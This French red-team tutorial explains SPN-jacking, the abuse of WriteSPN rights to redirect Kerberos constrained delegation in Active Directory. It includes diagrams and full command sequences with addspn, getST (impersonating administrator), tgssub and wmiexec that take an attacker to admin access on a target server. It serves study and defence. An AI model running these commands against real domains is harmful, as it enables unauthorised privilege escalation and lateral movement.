# SPN-Jacking — Abus de WriteSPN & Kerberos Constrained Delegation

## <mark style="color:red;">🎯 SPN-Jacking — Abus de WriteSPN & Kerberos Constrained Delegation</mark>

> **Source** : [Semperis — SPN-jacking: An Edge Case in WriteSPN Abuse](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/) — _Elad Shamir_\
> **Référence complémentaire** : [The Hacker Recipes — SPN-jacking](https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking)\
> **Traduit et enrichi en français** | Niveau : Red Team avancé / OSCP+

***

### <mark style="color:blue;">1. Résumé (TL;DR)</mark>

Le **SPN-Jacking** est une technique d'attaque Active Directory qui combine :

* L'abus d'une **Kerberos Constrained Delegation (KCD)** déjà configurée
* L'exploitation du droit **WriteSPN** sur des comptes machine/service

**L'idée centrale :**

> Un attaquant qui contrôle un compte configuré en _Constrained Delegation_ mais **sans** le privilège `SeEnableDelegation` (qui permettrait de modifier les contraintes) peut **déplacer temporairement le SPN cible** vers une autre machine pour réorienter l'attaque S4U vers une cible de son choix.

```
Sans SPN-Jacking     → Delegation vers ServerB (fixe, pas utile)
Avec SPN-Jacking     → Delegation redirigée vers ServerC (cible intéressante)
```

***

### <mark style="color:blue;">2. Rappels Théoriques Fondamentaux</mark>

#### <mark style="color:green;">2.1 SPN — Service Principal Name</mark>

Un **SPN** est un identifiant unique associé à un service dans Active Directory. Il permet à Kerberos de savoir quel compte de service est responsable d'un service donné.

**Format d'un SPN :**

```
ServiceClass/HostName[:Port]

Exemples :
  cifs/ServerB.domain.local
  http/webserver.domain.local
  MSSQLSvc/sqlserver.domain.local:1433
  HOST/ServerA.domain.local
```

**Stockage dans AD :**

```
Attribut LDAP : ServicePrincipalName (multi-valueurs)
Objet         : Compte utilisateur ou machine ($)
```

**Qui peut lire les SPNs ?**

```
→ Tout utilisateur authentifié du domaine
→ Via LDAP ou des outils comme setspn, PowerView, BloodHound
```

#### <mark style="color:green;">2.2 Kerberos Constrained Delegation (KCD)</mark>

La **délégation Kerberos contrainte** permet à un service (ServerA) d'**agir au nom d'un utilisateur** pour accéder à un autre service spécifique.

```
Attribut LDAP : msDS-AllowedToDelegateTo
                → Contient la liste des SPNs autorisés
```

**Deux modes :**

| Mode                             | Description                                                  | Protocole            |
| -------------------------------- | ------------------------------------------------------------ | -------------------- |
| **Avec transition de protocole** | ServerA peut s'authentifier avec n'importe quel protocole    | S4U2Self + S4U2Proxy |
| **Sans transition de protocole** | L'utilisateur doit s'être authentifié via Kerberos au départ | S4U2Proxy uniquement |

**Schéma KCD normal :**

```
Utilisateur → [TGT] → KDC
                        ↓
ServerA demande un TGS pour l'utilisateur vers ServerB
                        ↓
ServerA accède à ServerB EN SE FAISANT PASSER pour l'utilisateur
```

**Limitation clé :** La liste des SPNs dans `msDS-AllowedToDelegateTo` est **fixe** — pour la modifier, il faut le privilège `SeEnableDelegation`.

#### <mark style="color:green;">2.3 S4U2Self et S4U2Proxy</mark>

**S4U2Self** (_Service for User to Self_) :

```
Permet à un service de demander un ticket de service
POUR un utilisateur SANS que cet utilisateur se soit
authentifié au départ.

→ Produit un TGS "au nom de" l'utilisateur, pour lui-même
→ Nécessite que le compte soit configuré pour KCD avec
  protocol transition (TrustedToAuthForDelegation = True)
```

**S4U2Proxy** (_Service for User to Proxy_) :

```
Permet au service d'utiliser le TGS obtenu via S4U2Self
pour demander un autre TGS vers un SPN cible.

→ Le SPN cible DOIT être dans msDS-AllowedToDelegateTo
→ Produit un ticket de service pour un utilisateur vers
  un service tiers (ex: cifs/ServerB)
```

**Chaîne complète S4U :**

```
ServerA (KCD configuré)
  │
  ├── S4U2Self  ──► KDC ──► TGS(utilisateur → ServerA)
  │
  └── S4U2Proxy ──► KDC ──► TGS(utilisateur → cifs/ServerB)
                              └── ServerA accède à ServerB
                                  en se faisant passer pour l'utilisateur
```

#### <mark style="color:green;">2.4 WriteSPN — Le Droit Clé</mark>

**`WriteSPN`** est un droit Active Directory introduit comme arête (_edge_) dans **BloodHound 4.1** pour distinguer spécifiquement le droit de modifier l'attribut `ServicePrincipalName`.

```
Droits permettant de modifier les SPNs d'un objet :
  ✦ GenericAll          → contrôle total (inclut WriteSPN)
  ✦ GenericWrite        → écriture sur tous les attributs
  ✦ WriteProperty       → écriture sur ServicePrincipalName
  ✦ WriteSPN (BH 4.1)   → droit spécifique sur l'attribut SPN
```

**Ce que permet WriteSPN :**

```
  → Ajouter un SPN à un compte  : setspn -A cifs/target account$
  → Supprimer un SPN d'un compte: setspn -D cifs/target account$
  → Déplacer un SPN d'un compte à un autre (en 2 étapes)
```

***

### <mark style="color:blue;">3. Le Concept de SPN-Jacking</mark>

#### <mark style="color:green;">Problème de départ</mark>

Un attaquant compromet **ServerA** qui est configuré en **Constrained Delegation** vers `cifs/ServerB`.

```
État initial :

ServerA [msDS-AllowedToDelegateTo = cifs/ServerB]
                    ↓
L'attaquant peut se faire passer pour un admin sur ServerB
MAIS : ServerB n'est pas une cible intéressante.
La vraie cible = ServerC.

L'attaquant n'a pas SeEnableDelegation
→ Impossible de modifier msDS-AllowedToDelegateTo pour ajouter ServerC
→ Dead-end classique...
```

#### <mark style="color:green;">Solution : SPN-Jacking</mark>

```
Idée : si on ne peut pas modifier la DESTINATION de la délégation,
       on peut modifier le PROPRIÉTAIRE du SPN cible !

Plutôt que : ServerA → cifs/ServerB → changer vers ServerC
Faire       : ServerA → cifs/ServerB (maintenant sur ServerC !)

Étapes :
  1. Supprimer cifs/ServerB de ServerB$  (besoin de WriteSPN sur ServerB)
  2. Ajouter   cifs/ServerB à  ServerC$  (besoin de WriteSPN sur ServerC)
  3. Exécuter S4U2Self + S4U2Proxy vers cifs/ServerB
     → Le KDC émet un ticket pour... ServerC (le nouveau propriétaire)
  4. Modifier le SPN du ticket (tgssub) → cifs/ServerC
  5. Utiliser le ticket → accès admin sur ServerC ✅
```

***

### <mark style="color:blue;">4. Les Deux Variantes d'Attaque</mark>

#### <mark style="color:green;">Variante A — Ghost SPN-Jacking (SPN orphelin)</mark>

```
Condition : Le SPN listé dans msDS-AllowedToDelegateTo
            n'est PLUS associé à aucun compte actif.

Cas possibles :
  → Compte machine supprimé mais SPN pas nettoyé
  → Compte renommé sans mise à jour des SPNs
  → SPN custom retiré manuellement d'un compte

Action requise :
  ✦ WriteSPN sur ServerC uniquement
  → Ajouter directement le SPN orphelin à ServerC
  → Pas besoin de toucher à ServerB (n'existe plus)
```

**Schéma Ghost SPN-Jacking :**

```
  msDS-AllowedToDelegateTo de ServerA :
  ┌─────────────────────────────────┐
  │  cifs/ServerB  (⚠️ ORPHELIN)   │ ← Plus de compte "ServerB$" actif
  └─────────────────────────────────┘

  Attaquant :
  ┌──────────────────────────────────────────┐
  │  addspn cifs/ServerB → ServerC$          │
  │  (WriteSPN sur ServerC suffit)           │
  └──────────────────────────────────────────┘
              ↓
  ServerC$ possède maintenant cifs/ServerB
              ↓
  S4U2Proxy → ticket pour "cifs/ServerB" = accès sur ServerC ✅
```

#### <mark style="color:green;">Variante B — Live SPN-Jacking (SPN actif)</mark>

```
Condition : Le SPN listé dans msDS-AllowedToDelegateTo
            est ACTUELLEMENT associé à un compte actif (ServerB).

Action requise :
  ✦ WriteSPN sur ServerB  (pour supprimer le SPN)
  ✦ WriteSPN sur ServerC  (pour ajouter le SPN)
  → Opération temporaire : supprimer de B, ajouter à C
```

**Schéma Live SPN-Jacking :**

```
  AVANT :
  ┌──────────┐    msDS-AllowedToDelegateTo     ┌──────────────────┐
  │ ServerA  │ ──────── cifs/ServerB ─────────►│ ServerB$         │
  │  (KCD)   │                                  │ (propriétaire B) │
  └──────────┘                                  └──────────────────┘

  ÉTAPE 1 — Supprimer cifs/ServerB de ServerB$ :
  ┌──────────────────────────────────────────┐
  │  addspn --clear cifs/ServerB → ServerB$  │
  │  (WriteSPN requis sur ServerB$)           │
  └──────────────────────────────────────────┘

  ÉTAPE 2 — Ajouter cifs/ServerB à ServerC$ :
  ┌──────────────────────────────────────────┐
  │  addspn cifs/ServerB → ServerC$          │
  │  (WriteSPN requis sur ServerC$)           │
  └──────────────────────────────────────────┘

  APRÈS :
  ┌──────────┐    msDS-AllowedToDelegateTo     ┌──────────────────┐
  │ ServerA  │ ──────── cifs/ServerB ─────────►│ ServerC$         │
  │  (KCD)   │                                  │ (nouveau proprio)│
  └──────────┘                                  └──────────────────┘
              ↓ S4U attack
        Ticket pour admin sur ServerC ✅
```

***

### <mark style="color:blue;">5. Prérequis & Conditions</mark>

#### Ce dont l'attaquant a besoin

| Prérequis                     | Description                                | Obligatoire ?                       |
| ----------------------------- | ------------------------------------------ | ----------------------------------- |
| Contrôle de **ServerA**       | Compte machine ou service configuré en KCD | ✅ Oui                               |
| **KCD configuré** sur ServerA | `msDS-AllowedToDelegateTo` non vide        | ✅ Oui                               |
| **WriteSPN** sur ServerC      | Pouvoir ajouter le SPN à la cible          | ✅ Oui                               |
| **WriteSPN** sur ServerB      | Supprimer le SPN de l'objet actuel         | ✅ Seulement pour _Live_ SPN-Jacking |
| **SeEnableDelegation**        | Modifier les contraintes de délégation     | ❌ PAS nécessaire                    |

#### <mark style="color:green;">Ce qui n'est PAS requis (originalité de l'attaque)</mark>

```
✗ SeEnableDelegation         → pas besoin de modifier msDS-AllowedToDelegateTo
✗ Domain Admin               → un compte compromis avec les bons droits suffit
✗ GenericAll / GenericWrite  → WriteSPN seul peut suffire
✗ Accès direct au DC         → tout passe par des requêtes Kerberos normales
```

***

### <mark style="color:blue;">6. Scénario du Lab</mark>

#### Environnement de référence

```
Domaine : domain.local
DC      : DomainController.domain.local

┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  ServerA$   → Compromis par l'attaquant                     │
│               Configuré en KCD : cifs/ServerB               │
│               (msDS-AllowedToDelegateTo = cifs/ServerB)     │
│                                                              │
│  NotAdmin   → Compte compromis par l'attaquant              │
│               A le droit WriteSPN sur les comptes machines   │
│                                                              │
│  ServerB$   → Propriétaire actuel de cifs/ServerB           │
│               (pas la cible, pas intéressant)               │
│                                                              │
│  ServerC$   → CIBLE de l'attaquant                          │
│               L'attaquant veut un accès admin dessus        │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

#### Résumé des droits de l'attaquant

```
  Attaquant
     │
     ├── Contrôle ServerA$ (via compromise)
     │     └── msDS-AllowedToDelegateTo = [ cifs/ServerB ]
     │
     ├── Contrôle NotAdmin
     │     ├── WriteSPN sur ServerB$ (pour Live SPN-Jacking)
     │     └── WriteSPN sur ServerC$ (pour assigner le SPN cible)
     │
     └── Objectif : accès admin sur ServerC$
```

***

### 7. Schéma d'Attaque Global

```
╔══════════════════════════════════════════════════════════════════════╗
║                    SPN-JACKING — FLUX COMPLET                       ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ÉTAT INITIAL                                                        ║
║  ──────────────                                                      ║
║                                                                      ║
║  ServerA$  ──[KCD]──►  cifs/ServerB  ──► ServerB$ (pas intéressant)║
║                                                                      ║
║  Attaquant contrôle : ServerA$ + NotAdmin (WriteSPN)                ║
║  Cible souhaitée    : ServerC$                                       ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ÉTAPE 1 — IDENTIFIER la configuration KCD                          ║
║  ──────────────────────────────────────────                          ║
║  findDelegation.py → lister msDS-AllowedToDelegateTo de ServerA$    ║
║  Résultat : cifs/ServerB                                             ║
║                                                                      ║
║  ÉTAPE 2 — DÉPLACER le SPN (Live ou Ghost)                          ║
║  ──────────────────────────────────────────                          ║
║                                                                      ║
║  [Live]  addspn --clear cifs/ServerB  sur ServerB$                  ║
║          addspn         cifs/ServerB  sur ServerC$                  ║
║                                                                      ║
║  [Ghost] addspn         cifs/ServerB  sur ServerC$ (direct)         ║
║                                                                      ║
║  ÉTAT INTERMÉDIAIRE :                                                ║
║  ServerA$  ──[KCD]──►  cifs/ServerB  ──► ServerC$ (notre cible !)  ║
║                                                                      ║
║  ÉTAPE 3 — ATTAQUE S4U (impersonation Domain Admin)                 ║
║  ──────────────────────────────────────────────────                  ║
║  getST.py -spn cifs/ServerB -impersonate Administrator              ║
║                                                                      ║
║    S4U2Self  → TGS(Administrator → ServerA$)                        ║
║    S4U2Proxy → TGS(Administrator → cifs/ServerB) = accès ServerC   ║
║                                                                      ║
║  ÉTAPE 4 — MODIFIER le SPN du ticket                                ║
║  ────────────────────────────────────                                ║
║  tgssub.py -altservice cifs/ServerC                                  ║
║  (remplace cifs/serverB par cifs/serverC dans le ticket)            ║
║                                                                      ║
║  ÉTAPE 5 — UTILISER le ticket                                       ║
║  ────────────────────────────                                        ║
║  export KRB5CCNAME=newticket.ccache                                  ║
║  impacket-smbclient -k -no-pass ServerC.domain.local                ║
║                                                                      ║
║  → ACCÈS ADMIN SUR ServerC ✅                                        ║
╚══════════════════════════════════════════════════════════════════════╝
```

***

### <mark style="color:blue;">8. Scénario 1 — Ghost SPN-Jacking (SPN Orphelin)</mark>

C'est le scénario **le plus simple**. Le SPN référencé dans `msDS-AllowedToDelegateTo` de ServerA n'est plus associé à aucun compte actif.

#### <mark style="color:green;">Pourquoi ce cas se produit-il ?</mark>

```
Causes courantes :
  → Compte machine supprimé sans nettoyer les configs de délégation
  → Machine renommée, SPNs automatiquement mis à jour ≠ config KCD restée
  → SPN custom ajouté puis retiré d'un compte service
  → Compte service désactivé/supprimé mais délégation jamais révisée
```

#### <mark style="color:green;">Exploitation</mark>

```
Condition : cifs/ServerB n'est dans le ServicePrincipalName d'AUCUN objet AD

Action :
  1. Vérifier que le SPN est bien orphelin
  2. Ajouter directement cifs/ServerB à ServerC$
  3. Lancer l'attaque S4U
```

```bash
# Vérifier que le SPN n'appartient à personne
setspn -Q cifs/ServerB
# Résultat attendu : "No such SPN found" → orphelin confirmé

# Ajouter le SPN orphelin à ServerC (WriteSPN requis sur ServerC$)
python3 addspn.py \
  -t 'ServerC$' \
  --spn "cifs/ServerB" \
  -u "$DOMAIN/NotAdmin" \
  -p "$PASSWORD" \
  'DomainController.domain.local'

# Lancer S4U attack depuis ServerA
python3 getST.py \
  -spn "cifs/ServerB" \
  -impersonate "administrator" \
  "$DOMAIN/ServerA$:$PASSWORD"

# Modifier le SPN du ticket pour cibler ServerC
python3 tgssub.py \
  -in administrator.ccache \
  -out final_ticket.ccache \
  -altservice "cifs/ServerC"
```

***

### <mark style="color:blue;">9. Scénario 2 — Live SPN-Jacking (SPN Actif)</mark>

Le SPN est **actuellement actif** et appartient à ServerB. Il faut d'abord le retirer de ServerB avant de l'assigner à ServerC.

#### <mark style="color:green;">Détail du flux</mark>

```
AVANT :
  ServerB$.ServicePrincipalName = [ ..., cifs/ServerB, ... ]
  ServerC$.ServicePrincipalName = [ HOST/ServerC, ... ]

APRÈS le SPN-Jacking :
  ServerB$.ServicePrincipalName = [ ... ]               ← cifs/ServerB retiré
  ServerC$.ServicePrincipalName = [ HOST/ServerC, ..., cifs/ServerB ]
```

> ⚠️ **Impact opérationnel :** Retirer un SPN actif d'un compte peut briser temporairement des services légitimes utilisant ce SPN. À faire prudemment en Red Team réel.

#### Exploitation

```bash
# Étape 1 : Voir la config KCD de ServerA
python3 findDelegation.py \
  -user 'ServerA$' \
  "$DOMAIN/NotAdmin:$PASSWORD"
# Résultat : ServerA$ → Constrained w/ Protocol Transition → cifs/ServerB

# Étape 2 : Retirer cifs/ServerB de ServerB$ (WriteSPN requis sur ServerB$)
python3 addspn.py \
  --clear \
  -t 'ServerB$' \
  -u "$DOMAIN/NotAdmin" \
  -p "$PASSWORD" \
  'DomainController.domain.local'

# Étape 3 : Ajouter cifs/ServerB à ServerC$ (WriteSPN requis sur ServerC$)
python3 addspn.py \
  -t 'ServerC$' \
  --spn "cifs/ServerB" \
  -u "$DOMAIN/NotAdmin" \
  -p "$PASSWORD" \
  -c 'DomainController.domain.local'

# Étape 4 : Attaque S4U depuis ServerA$ (KCD avec protocol transition)
python3 getST.py \
  -spn "cifs/ServerB" \
  -impersonate "administrator" \
  "$DOMAIN/ServerA$:$PASSWORD"

# Étape 5 : Substitution du SPN dans le ticket
python3 tgssub.py \
  -in administrator.ccache \
  -out final_ticket.ccache \
  -altservice "cifs/ServerC"

# Étape 6 : Utiliser le ticket pour accéder à ServerC
export KRB5CCNAME=final_ticket.ccache
python3 smbclient.py -k -no-pass "ServerC.domain.local"
# ou
python3 wmiexec.py -k -no-pass "administrator@ServerC.domain.local"
```

***
